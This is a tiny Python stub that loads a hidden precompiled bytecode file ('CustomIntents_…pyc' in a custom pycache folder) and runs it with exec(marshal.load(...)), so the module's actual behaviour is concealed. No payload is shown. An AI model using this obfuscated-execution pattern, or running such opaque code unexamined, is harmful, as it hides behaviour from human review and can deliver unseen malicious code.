
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'CustomIntents_8d63965b29e74f2badbc1fb3d2aa469f.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
